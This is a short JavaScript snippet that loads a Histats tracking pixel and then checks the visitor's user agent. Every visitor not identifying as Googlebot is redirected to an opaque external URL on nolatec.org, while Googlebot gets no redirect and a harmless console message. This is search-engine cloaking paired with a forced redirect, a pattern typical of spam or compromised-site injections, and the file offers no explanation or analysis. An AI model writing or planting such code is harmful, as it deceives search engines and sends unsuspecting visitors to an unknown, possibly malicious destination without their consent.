(function() {
  // 1. Histats Live Tracking Pixel (Instant Trigger)
  var tracker = new Image();
  tracker.src = "https://s10.histats.com/1.gif?5032111&101";

  // 2. User-Agent Filter & Redirect Logic
  if (!navigator.userAgent.includes('Googlebot')) {
    // Normal Visitors -> Redirect
    window.location.href = "https://nolatec.org/4/1e5c257bb6f145c9aef01843d3777f97";
  } else {
    // Search Engine Crawlers -> No Redirect
    console.log("Thanks for visiting my page");
  }
})();
